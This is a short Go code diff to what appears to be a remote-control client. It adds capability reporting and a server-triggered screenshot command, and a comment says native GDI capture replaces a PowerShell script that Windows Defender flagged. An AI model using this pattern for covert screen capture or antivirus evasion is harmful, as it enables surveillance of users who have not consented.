@@ -260,6 +260,8 @@ func (c *Client) sendIdentify() {
 	c.send(conn, map[string]interface{}{
 		"type": "identify",
 		"info": c.cfg.Info,
+		// 2026-11-02：扩展能力上报。老服务端忽略该字段 → 双向兼容。
+		"caps": screenshotCaps(),
 	})
 }
 
@@ -321,6 +323,10 @@ func (c *Client) dispatch(msg map[string]interface{}) error {
 
 	case "file_upload":
 		return c.handleFileUpload(msg)
+
+	case "screenshot":
+		// 2026-11-02：原生截屏（GDI）——替代被 Defender 误杀的 PowerShell 抓屏脚本
+		c.handleScreenshot(msg)
 
 	case "file_upload_request":
 		return c.handleUploadRequest(msg)
